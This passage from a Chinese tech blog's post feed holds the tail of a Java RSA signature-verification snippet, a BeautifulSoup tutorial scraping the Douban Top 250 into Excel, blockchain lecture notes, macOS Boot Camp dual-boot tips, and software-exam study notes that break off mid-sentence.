<span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(Base64.getEncoder().encode(publicKey</span><br><span class="line">                .getEncoded()));</span><br><span class="line">        System.out.println(<span class="string">&quot;-----------------公钥--------------------&quot;</span>);</span><br><span class="line">        System.out.println(publicKeyString);</span><br><span class="line">        System.out.println(<span class="string">&quot;-----------------公钥--------------------&quot;</span>);</span><br><span class="line">        <span class="type">Signature</span> <span class="variable">verifySign</span> <span class="operator">=</span> Signature.getInstance(SIGNATURE_ALGORITHM);</span><br><span class="line">        verifySign.initVerify(publicKey);</span><br><span class="line">        <span class="comment">// 用于验签的数据</span></span><br><span class="line">        System.out.println(<span class="string">&quot;requestBody is &quot;</span> + requsetBody);</span><br><span class="line">        verifySign.update(requsetBody.getBytes());</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">flag</span> <span class="operator">=</span> verifySign.verify(Base64.getDecoder().decode(signature));</span><br><span class="line">        System.out.println(<span class="string">&quot;verifySign is &quot;</span> + flag);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (InvalidKeyException e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (NoSuchAlgorithmException e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (SignatureException e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (CertificateException e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (FileNotFoundException e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>beautifulSoup爬取同步加载页面数据</title>
      <link href="/2019/11/15/beautifulSoup%E7%88%AC%E5%8F%96%E5%90%8C%E6%AD%A5%E5%8A%A0%E8%BD%BD%E9%A1%B5%E9%9D%A2%E6%95%B0%E6%8D%AE/"/>
      <url>/2019/11/15/beautifulSoup%E7%88%AC%E5%8F%96%E5%90%8C%E6%AD%A5%E5%8A%A0%E8%BD%BD%E9%A1%B5%E9%9D%A2%E6%95%B0%E6%8D%AE/</url>
      
        <content type="html"><![CDATA[<p>beautifulSoup 可以很方便的获取 html 页面的标签节点，而且也很容易获取到标签的属性和文本内容。我们就运用 beautifulSoup 来爬取同步加载页面数据，然后我们将获取到的数据存入到 excel 中。</p><span id="more"></span><h2 id="爬取同步加载页面数据"><a href="#爬取同步加载页面数据" class="headerlink" title="爬取同步加载页面数据"></a>爬取同步加载页面数据</h2><p>我们这里爬取豆瓣电影Top 250 的数据做描述，<code>request</code>库请求页面，<code>beautifulSoup</code>用来获取页面节点，所使用到的库自行安装。</p><h3 id="获取页面源码"><a href="#获取页面源码" class="headerlink" title="获取页面源码"></a>获取页面源码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">from urllib import request</span><br><span class="line">from chardet import detect</span><br><span class="line">from bs4 import BeautifulSoup</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def get_soup(page_url):</span><br><span class="line">    &quot;&quot;&quot;获取源码&quot;&quot;&quot;</span><br><span class="line">    with request.urlopen(page_url) as fp:</span><br><span class="line">        byt = fp.read()</span><br><span class="line">        det = detect(byt)</span><br><span class="line">        return BeautifulSoup(byt.decode(det[&#x27;encoding&#x27;]), &#x27;lxml&#x27;)</span><br></pre></td></tr></table></figure><p><code>page_url</code>为页面地址，<code>lxml</code>为<code>python</code>库自行安装。</p><h3 id="获取页面数据"><a href="#获取页面数据" class="headerlink" title="获取页面数据"></a>获取页面数据</h3><p>我们运用<code>beautifulSoup</code>来获取页面的数据，数据一般存放在页面的节点内容中（如：标题、价格、数量）和节点的属性中（图片链接），所以我们需要找到这些存放数据的相应节点。</p><p><img src="https://cdn.zhengxiangling.com/superbed/2019/11/15/5dce0edf8e0e2e3ee92f82d9.jpg" class="lazyload" data-srcset="https://cdn.zhengxiangling.com/superbed/2019/11/15/5dce0edf8e0e2e3ee92f82d9.jpg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="douban电影top250数据节点"></p><p>我们需要从中找到一些规律，每部电影的数据都存放在一个<code>li</code>中，所有的<code>li</code>都存放在一个<code>ol</code>中，图片的链接在<code>li</code>的<code>img</code>标签的<code>src</code>属性中，其他的数据都放在带有<code>class</code>属性的<code>span</code>标签中。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"># 正则式</span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line">def get_data(page):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    获取数据</span><br><span class="line">    selelct 可以用css语法获取标签，find可以获取标签里的 attrs 属性值</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    data = []</span><br><span class="line">    ol = page.find(&#x27;ol&#x27;, attrs=&#123;&#x27;class&#x27;: &#x27;grid_view&#x27;&#125;)</span><br><span class="line">    for li in ol.select(&#x27;li&#x27;):</span><br><span class="line">        # 单元</span><br><span class="line">        tmp = []</span><br><span class="line">        # 多个 title</span><br><span class="line">        titles = []</span><br><span class="line">        img_url = li.find(&#x27;img&#x27;).attrs[&#x27;src&#x27;].strip()</span><br><span class="line">        tmp.append(img_url)</span><br><span class="line">        for span in li.findAll(&#x27;span&#x27;, attrs=&#123;&quot;class&quot;: re.compile(&#x27;&#x27;)&#125;):</span><br><span class="line">            if span.attrs[&#x27;class&#x27;][0] == &#x27;title&#x27;:</span><br><span class="line">                titles.append(span.string.strip())</span><br><span class="line">            # 评价</span><br><span class="line">            if span.attrs[&#x27;class&#x27;][0] == &#x27;rating_num&#x27;:</span><br><span class="line">                tmp.append(span.string.strip())</span><br><span class="line">            # 简评</span><br><span class="line">            if span.attrs[&#x27;class&#x27;][0] == &#x27;inq&#x27;:</span><br><span class="line">                tmp.append(span.string.strip())</span><br><span class="line">        tmp.insert(0, titles)</span><br><span class="line">        data.append(tmp)</span><br><span class="line">    return data</span><br></pre></td></tr></table></figure><h3 id="获取下一页的数据"><a href="#获取下一页的数据" class="headerlink" title="获取下一页的数据"></a>获取下一页的数据</h3><p>我们先需要在页面中找到下一页数据请求的参数<br><img src="https://cdn.zhengxiangling.com/superbed/2019/11/15/5dce1b588e0e2e3ee931cd7c.jpg" class="lazyload" data-srcset="https://cdn.zhengxiangling.com/superbed/2019/11/15/5dce1b588e0e2e3ee931cd7c.jpg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="下一页按钮"><br>我们可以看到下一页的参数为<code>?start=25&amp;filter=</code>，所以获取到这个参数然后加入到之前的网址当中，获取到的数据就是下一页的数据了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">def next_url(page):</span><br><span class="line">    &quot;&quot;&quot;获取下一页链接后缀&quot;&quot;&quot;</span><br><span class="line">    a = page.find(&#x27;a&#x27;, text=re.compile(&quot;^后页&quot;))</span><br><span class="line">    if a:</span><br><span class="line">        return a.attrs[&#x27;href&#x27;]</span><br><span class="line">    else:</span><br><span class="line">        return None</span><br></pre></td></tr></table></figure><h3 id="保存数据到-excel-中"><a href="#保存数据到-excel-中" class="headerlink" title="保存数据到 excel 中"></a>保存数据到 excel 中</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">import xlwt</span><br><span class="line"></span><br><span class="line">def xls_save(workbook, data, count):</span><br><span class="line">    &quot;&quot;&quot;保存数据到excel&quot;&quot;&quot;</span><br><span class="line">    for d in data:</span><br><span class="line">        for i in range(len(d)):</span><br><span class="line">            # print(d[i])</span><br><span class="line">            workbook.write(count, i, d[i])</span><br><span class="line">        count = count + 1</span><br><span class="line">    return workbook, count</span><br></pre></td></tr></table></figure><p><code>xlwt</code>为<code>python</code>库自行安装，<code>workbook</code>为要保存的<code>excel</code>对象，<code>data</code>为<code>beautifulSoup</code>对象，<code>count</code>为要写入数据的行数。</p><h3 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"># 爬取豆瓣电影 top250</span><br><span class="line"></span><br><span class="line">from urllib import request</span><br><span class="line">from chardet import detect</span><br><span class="line">from bs4 import BeautifulSoup</span><br><span class="line">import re</span><br><span class="line">import xlwt</span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def get_soup(page_url):</span><br><span class="line">    &quot;&quot;&quot;获取源码&quot;&quot;&quot;</span><br><span class="line">    with request.urlopen(page_url) as fp:</span><br><span class="line">        byt = fp.read()</span><br><span class="line">        det = detect(byt)</span><br><span class="line">        return BeautifulSoup(byt.decode(det[&#x27;encoding&#x27;]), &#x27;lxml&#x27;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def get_data(page):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    获取数据</span><br><span class="line">    selelct 可以用css语法获取标签，find可以获取标签里的 attrs 属性值</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    data = []</span><br><span class="line">    ol = page.find(&#x27;ol&#x27;, attrs=&#123;&#x27;class&#x27;: &#x27;grid_view&#x27;&#125;)</span><br><span class="line">    for li in ol.select(&#x27;li&#x27;):</span><br><span class="line">        # 单元</span><br><span class="line">        tmp = []</span><br><span class="line">        # 多个 title</span><br><span class="line">        titles = []</span><br><span class="line">        img_url = li.find(&#x27;img&#x27;).attrs[&#x27;src&#x27;].strip()</span><br><span class="line">        tmp.append(img_url)</span><br><span class="line">        for span in li.findAll(&#x27;span&#x27;, attrs=&#123;&quot;class&quot;: re.compile(&#x27;&#x27;)&#125;):</span><br><span class="line">            if span.attrs[&#x27;class&#x27;][0] == &#x27;title&#x27;:</span><br><span class="line">                titles.append(span.string.strip())</span><br><span class="line">            if span.attrs[&#x27;class&#x27;][0] == &#x27;rating_num&#x27;:</span><br><span class="line">                tmp.append(span.string.strip())</span><br><span class="line">            if span.attrs[&#x27;class&#x27;][0] == &#x27;inq&#x27;:</span><br><span class="line">                tmp.append(span.string.strip())</span><br><span class="line">        tmp.insert(0, titles)</span><br><span class="line">        data.append(tmp)</span><br><span class="line">    return data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def next_url(page):</span><br><span class="line">    &quot;&quot;&quot;获取下一页链接后缀&quot;&quot;&quot;</span><br><span class="line">    a = page.find(&#x27;a&#x27;, text=re.compile(&quot;^后页&quot;))</span><br><span class="line">    if a:</span><br><span class="line">        return a.attrs[&#x27;href&#x27;]</span><br><span class="line">    else:</span><br><span class="line">        return None</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def xls_save(workbook, data, count):</span><br><span class="line">    &quot;&quot;&quot;保存数据到excel&quot;&quot;&quot;</span><br><span class="line">    for d in data:</span><br><span class="line">        for i in range(len(d)):</span><br><span class="line">            # print(d[i])</span><br><span class="line">            workbook.write(count, i, d[i])</span><br><span class="line">        count = count + 1</span><br><span class="line">    return workbook, count</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    url = &#x27;https://movie.douban.com/top250&#x27;</span><br><span class="line">    soup = get_soup(url)</span><br><span class="line">    # print(get_data(soup))</span><br><span class="line">    path = os.path.join(os.getcwd() + &quot;\\&quot; + &quot;douban-top250.xls&quot;)</span><br><span class="line">    xls_file = os.path.exists(path)</span><br><span class="line">    if xls_file:</span><br><span class="line">        os.remove(path)</span><br><span class="line">    wb = xlwt.Workbook(encoding=&#x27;utf-8&#x27;)</span><br><span class="line">    xls = wb.add_sheet(&#x27;top250&#x27;)</span><br><span class="line">    head = [&#x27;标题&#x27;, &#x27;图片地址&#x27;, &#x27;评分&#x27;, &#x27;简评&#x27;]  # 表头</span><br><span class="line">    row = 1</span><br><span class="line">    for h in range(len(head)):</span><br><span class="line">        xls.write(0, h, head[h])</span><br><span class="line">    xls, row = xls_save(xls, get_data(soup), 1)</span><br><span class="line">    nxt = next_url(soup)</span><br><span class="line">    while nxt:</span><br><span class="line">        soup = get_soup(url + nxt)</span><br><span class="line">        xls, row = xls_save(xls, get_data(soup), row)</span><br><span class="line">        nxt = next_url(soup)</span><br><span class="line">    wb.save(&#x27;douban-top250.xls&#x27;)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 爬虫 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> beautifulSoup </tag>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>区块链技术及应用现状</title>
      <link href="/2019/11/06/%E5%8C%BA%E5%9D%97%E9%93%BE%E6%8A%80%E6%9C%AF%E5%8F%8A%E5%BA%94%E7%94%A8%E7%8E%B0%E7%8A%B6-1/"/>
      <url>/2019/11/06/%E5%8C%BA%E5%9D%97%E9%93%BE%E6%8A%80%E6%9C%AF%E5%8F%8A%E5%BA%94%E7%94%A8%E7%8E%B0%E7%8A%B6-1/</url>
      
        <content type="html"><![CDATA[<blockquote><p>from 陈纯院士的讲座</p></blockquote><h2 id="区块链本质"><a href="#区块链本质" class="headerlink" title="区块链本质"></a>区块链本质</h2><h3 id="术语解释"><a href="#术语解释" class="headerlink" title="术语解释"></a>术语解释</h3><p>交易：交易指的是一次对账本的操作，如一笔转账交易。</p><p>区块：将一段时间内发生的所有交易和状态打包成为一个区块。</p><p>块链式数据结构（狭义区块链）：区块以时间顺序前后相连，组成一种块链式数据结构，及“区块链”一词的由来。</p><p>分布式账本（广义区块链）：多参与方各自部署，互联互通，构成分布式网络。</p><span id="more"></span><h3 id="三大支撑技术"><a href="#三大支撑技术" class="headerlink" title="三大支撑技术"></a>三大支撑技术</h3><p>共识算法：针对区块链上发生的交易，保障区块链所有节点数据一致性。</p><p>块链式数据结构：将一段时间内的交易数据打包成区块，再将多个区块按时间顺序有序链接的一种数据结构，用来确保数据的不可篡改性。</p><p>智能合约：一段部署在区块链上可自动运行的程序，可以自动化地执行预先定义好的规则和条款，通过减少人为干预的风险，提升交易的安全与可信任度。</p><h3 id="三种组织形态"><a href="#三种组织形态" class="headerlink" title="三种组织形态"></a>三种组织形态</h3><p>公有链：全球范围可以访问，不依赖于单个公司或辖区，匿名性强，任何参与者都可在中写入、读取、参与交易验证。</p><p>联盟链：联盟链仅限于联盟成员参与，系统内交易确认节点为事先设定，并通过共识机制确认。</p><p>私有链：仅在机构内使用，读写权、记账权由组织内自由定制。中心控制者制定可参与和进行交易验证成员范围。</p><h3 id="共识算法"><a href="#共识算法" class="headerlink" title="共识算法"></a>共识算法</h3><p>BFT(拜占庭容错算法)</p><ul><li><p>数学证明当且仅当三分之二以上的节点忠诚时，可以保证系统运行结果的正确性。</p></li><li><p>三大协议：</p><ul><li>三阶段共识协议：保证了主节点打包的区块通过三阶段共识完成打包结果的一致性确认</li><li>视图变更协议：保证了在主节点作恶情况下，系统可以通过该协议选举出新任的主节点进行共识，且不破坏其原有的共识状态</li><li>检查点机制：保证了各节点经过确认的一致性状态得以持久化</li></ul></li></ul><h3 id="行业分类"><a href="#行业分类" class="headerlink" title="行业分类"></a>行业分类</h3><p>币&#x2F;模式：比特币 天秤币 Libra（Facebook发行） 摩根币 JPM（摩根大通发行）</p><p>链&#x2F;技术：公有链 联盟链</p><h3 id="顶层设计"><a href="#顶层设计" class="headerlink" title="顶层设计"></a>顶层设计</h3><p>中共中央政治局10月24日下午就区块链技术发展现状和趋势进行第十八次集体学习。中共中央总书记习近平在主持学习时强调，区块链技术的集成应用在新的技术革新和产业变革中起着重要作用。我们要把区块链作为核心技术自主创新的重要突破口，明确主攻方向，加大投入力度，着力攻克一批关键核心技术，加快推动区块链技术和产业创新发展。</p><h4 id="产业应用"><a href="#产业应用" class="headerlink" title="产业应用"></a>产业应用</h4><ul><li><p>要推动区块链和实体经济深度融合，解决中小企业贷款融资难、银行风控难、部门监管难等问题。</p></li><li><p>要利用区块链技术探索数字经济模式创新。</p></li><li><p>要探索“区块链+”在民生领域的运用，积极推动区块链技术在教育、就业、养老、精准脱贫、医疗健康、商品防伪、食品安全、公益、社会救助等领域的应用，为人民群众提供更加智能、更加便捷、更加优质的公共服务。</p></li><li><p>要推动区块链底层技术服务和新型智慧城市建设相结合探索在信息基础设施、智慧交通、能源电力等领域的推广应用，提升城市管理的智能化、精准化水平。</p></li><li><p>要利用区块链技术促进城市间在信息、资金、人才、征信等方面更大规模的互联互通。</p></li><li><p>要探索利用区块链数据共享模式，实现政务数据跨部门、跨区域共同维护和利用，促进业务协同办理。</p></li></ul><h3 id="技术革新"><a href="#技术革新" class="headerlink" title="技术革新"></a>技术革新</h3><p>当下，各大互联网公司隐私泄露事件频出，一次次加深了公众对垄断性互联网公司的警惕，去中心化的区块链技术被认为是推倒垄断、走向平等的重要技术手段；利用区块链技术的链式存储结构，保证数据不可篡改，密码学保证用户隐私，共识算法保证数据权平等，区块链技术正在构建一个全新的分布式技术架构，成为新一代基础设施。</p><ul><li><p>提升多中心协作效率</p></li><li><p>去中介，提升多方信任</p></li><li><p>打破数据孤岛，提升数据应用效率</p></li><li><p>数据不可篡改，可追溯，可审计</p></li><li><p>自动执行预设，提升约束力，减少摩擦</p></li></ul><h3 id="三个阶段"><a href="#三个阶段" class="headerlink" title="三个阶段"></a>三个阶段</h3><p>可信计算与存储（数据可信）：数字存证 审计监管</p><p>数字化社会（资产可信）：资产数字化 数据资产化</p><p>分布式商业（合作可信）：多中心弱中介 激励生态化</p><h2 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h2><p>1.业务协作：养老金托管</p><p>利用区块链统筹管理养老金业务信息，将养老金业务流程线上化，提升资金使用效率。</p><ul><li><p>实现养老金业务信息在参与机构之间快速同步</p></li><li><p>提高业务处理流程的透明度，增加数据可信度</p></li><li><p>减少业务处理周期，提高养老金申购赎回频率，提升资金使用率</p></li></ul><p>2.数字资产：信用保险</p><p>供应链企业通过信用险增信，使得信用风险得到更大范围的分散，满足企业低成本融资的诉求。</p><ul><li><p>为中小企业增信，缓解融资困难</p></li><li><p>标准化企业信用，实现风险缓释</p></li><li><p>实现供应链金融体系的信用穿透</p></li><li><p>助力完善社会信用体系</p></li></ul><p>3.存证溯源：可信存证</p><p>存证方通过区块链平台实现电子存证可信存储，任意相关方在线查阅验证。</p><ul><li><p>多方协同，随时调用，实现方便、快捷的可信电子存证</p></li><li><p>存证电子化，节约纸张成本</p></li><li><p>电子存证灵活对接，便于业务拓展</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 区块链 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 技术应用 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>macOS Mojave 安装双系统 bug 总结</title>
      <link href="/2019/03/23/macOS-Mojave%E5%AE%89%E8%A3%85%E5%8F%8C%E7%B3%BB%E7%BB%9F-bug-%E6%80%BB%E7%BB%93/"/>
      <url>/2019/03/23/macOS-Mojave%E5%AE%89%E8%A3%85%E5%8F%8C%E7%B3%BB%E7%BB%9F-bug-%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<p>  在 mac 上装 windows10 双系统一般是由于</p><ol><li>开发的需要，有些系统级的架构只支持windows，不适合在 mac 上开发。</li><li>运行的游戏只支持 windows，无法在 mac 上运行。</li></ol><p></p><p>macOS Mojave 只支持安装 windows10，往下的版本不再支持。<code>启动转移助理（BootCamp）</code>的功能目前也限制于制作双系统和将双系统恢复为单一分区，取消了之前支持windows多版本和制作u盘启动盘的选项。不过目前仍可用代码来制作u盘启动盘。</p><p>在 mac 上用 windows10 u盘启动盘来安装双系统是行不通的，因为会导致缺少驱动而不能往下安装，所以就只能走<code>启动转移助理</code>这条路。<br>windows10 经常更新版本，导致 mac 使用<code>启动转移助理</code>安装双系统时会出现各种各样的问题。列举如下：</p><ol><li>版本问题。用 macOS Mojave 10.14版本只能安装 windows10 4月版的，安装10月版的会出现错误。将macOS Mojave升级到 10.14.3版本解决版本问题。</li><li>外接设备导致无法安装 windows 的问题。当进入到 windows 安装界面时，必须把所有外接设备（鼠标、u盘等）全部拔出，不然会出现分区找不到的错误导致无法安装 windows。</li><li>一旦将 windows 安装完毕之后，分配的硬盘空间将无法调整，所以分磁盘空间的时候必须考虑清楚。</li><li>用 mac 上的<code>磁盘工具</code>直接将 windows 分区抹除再合并分区，可能会导致下次安装 windows 失败，所以要删掉之前安装好的 windows 的办法是用<code>启动转移助理</code>将 windows 合并成单一分区。</li></ol>]]></content>
      
      
      <categories>
          
          <category> 系统 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> macOS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>软考易错题总结</title>
      <link href="/2018/05/23/%E8%BD%AF%E8%80%83%E6%98%93%E9%94%99%E9%A2%98%E6%80%BB%E7%BB%93/"/>
      <url>/2018/05/23/%E8%BD%AF%E8%80%83%E6%98%93%E9%94%99%E9%A2%98%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<p>对于软考中经常做错的题，做个总结。</p><span id="more"></span><p>1、考查设计模式基础概念，需要搞清楚各个设计模式的特点与不同，设计模式共有结构型，创建型，行为型三大类，里面又各自包含了多种具体详细模式。具体内容如下：<br><img src="https://cdn.zhengxiangling.com/18-5-23/74933918.jpg" class="lazyload" data-srcset="https://cdn.zhengxiangling.com/18-5-23/74933918.jpg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p>例：<br>创建型设计模式抽象了实例化过程，有助于系统开发者将对象的创建、组合和表示方式进行抽象。以下（48）模式是创建型模式。<br>A．组合(Composite)B．装饰器（Decorator）<br>C．代理(Proxy)D．单例（Singleton）<br>【答案】D</p><p>2、考察软件测试的基础知识。</p><p>白盒测试的方法包括一系列的逻辑覆盖，主要的覆盖标准有语句覆盖、判定覆盖、条件覆盖、条件&#x2F;判定覆盖、条件组合覆盖、修正的条件&#x2F;判定覆盖和路径覆盖等。<br>（1）语句覆盖。语句覆盖是指选择足够多的测试用例，使得运行这些测试用例时，被测程序的每个语句至少执行一次。很显然，语句覆盖是一种很弱的覆盖标准。<br>（2）判定覆盖。判定覆盖也称为分支覆盖，它是指不仅每个语句至少执行一次，而且每个判定的每种可能的结果（分支）都至少执行一次。判定覆盖比语句覆盖强，但对程序逻辑的覆盖程度仍然不高。<br>（3）条件覆盖。条件覆盖是指不仅每个语句至少执行一次，而且使判定表达式中的每个条件都取得各种可能的结果。条件覆盖不一定包含判定覆盖，判定覆盖也不一定包含条件覆盖。<br>（4）路径覆盖。路径覆盖是指选取足够的测试用例，使得程序的每条可能执行到的路径都至少经过一次（如果程序中有环路，则要求每条环路路径至少经过一次）。路径覆盖实际上考虑了程序中各种判定结果的所有可能组合，因此是一种较强的覆盖标准。但路径覆盖并未考虑判定中的条件结果的组合，并不能代替条件覆盖和条件组合覆盖。</p><p>3、<br>数据字典是用来定义数据流图中各个成分的具体含义，它以一种准确的、无二义性的说明方法为系统的分析、设计及维护提供了有关元素一致的定义和详细的描述。<br>数据库设计可以分为需求分析阶段、概念结构设计、逻辑结构设计和物理结构设计等阶段。<br>需求分析阶段：分析用户的需求，包括数据、功能和性能需求；<br>概念结构设计：在分析阶段，已经得到了系统的数据流程图和数据字典，现在要结合数据规范化的理论，用一种数据模型将用户的数据需求明确地表示出来。概念数据模型是面向问题的模型，反映了用户的现实工作环境，是与数据库的具体实现技术无关的。建立系统概念数据模型的过程叫做概念结构设计。<br>逻辑结构设计：根据已经建立的概念数据模型，以及所采用的某个数据库管理系统软件的数据模型特性，按照一定的转换规则，把概念模型转换为这个数据库管理系统所能够接受的逻辑数据模型。不同的数据库管理系统提供了不同的逻辑数据模型，如层次模型、网状模型、关系模型等。物理结构设计：为一个确定的逻辑数据模型选择一个最适合应用要求的物理结构的过程，就叫做数据库的物理结构设计。<br>数据库在物理设备上的存储结构和存取方法称为数据库的物理数据模型。</p><p>4、<br>原子性：事务是原子的，要么做，要么都不做。<br>一致性：事务执行的结果必须保证数据库从一个一致性状态变到另一个一致性状态。<br>隔离性：事务相互隔离。当多个事务并发执行时，任一事务的更新操作直到其成功提交的整个过程，对其它事物都是不可见的。<br>持久性：一旦事务成功提交，即使数据库崩溃，其对数据库的更新操作也永久有效。<br>串行调度：多个事务依次串行执行，且只有当一个事务的所有操作都执行完后才执行另一个事务的所有操作。<br>可串行化保证了事务并行调度时，相互不破坏，同时保证了数据从一个一致性状态到另一个一致性状态。</p><p>5、<br>UML2.0中提供了13种图形，一部分图给出了系统的动态视图，一部分图则给出系统的静态视图。</p><p>活动图展现了在系统内从一个活动到另一个活动的流程， 专注于系统的动态视图，它对于系统的功能建模特别重要，并强调对象间的控制流程，是状态图的一种特殊情况。通信图强调收发消息的对象之间的结构组织， 强调参加交互的对象的组织。 序列图是场景的图形化表示， 描述了以时间顺序组织的对象之间的交互活动， 对用例中的场景可以采用序列图进行描述。 定时图或时序图， 是UML2.0中新增的、特别适合实时和嵌入式系统建模的交互图，它关注沿着线性时间轴、生命线内部和生命线之间的条件改变，描述对象状态随着时间改变的情况，很像示波器，如下图所示，适合分析周期和非周期性任务。</p><p>类图展现了一组对象、 接口、 协作及其之间的关系， 属于静态视图；对象图展现了某一时刻一组对象以及它们之间的关系， 描述了在类图中所建立的事物的实例的静态快照；组件图／构件图展现了一组构件之间的组织和依赖， 专注于系统的静态实现视图， 它与类图相关， 通常把构件映射为一个或多个类、 接口或协作：包图是用于把模型本身组织成层次结构的通用机制， 不能执行， 展现由模型本身分解而成的组织单元以及其间的依赖关系。</p><p>6、<br>从模块独立性角度看，以下几种模块内聚类型中，（50）内聚是最好的。</p><p>(50)A.巧合B.逻辑C.信息D.功能</p><p>【答案】D</p><p>【解析】本题考查软件设计的基础知识。</p><p>模块化是指将软件划分成独立命名且可以独立访问的模块， 不同的模块通常具有不同的功能或职责。 每个模块可以独立地开发、 测试， 最后组装成完整的软件。 模块独立性是指软件系统中每个模块只涉及软件要求的具体的一个子功能，而和其他模块之间的接口尽量简单， 是模块化设计的一个重要原则， 主要用模块间的精合和模块内的内聚来衡量。</p><p>模块的内聚性一搬有以下几种：<br>巧合内聚指一个模块内的几个处理元素之间没有任何联系。</p><p>逻辑内聚， 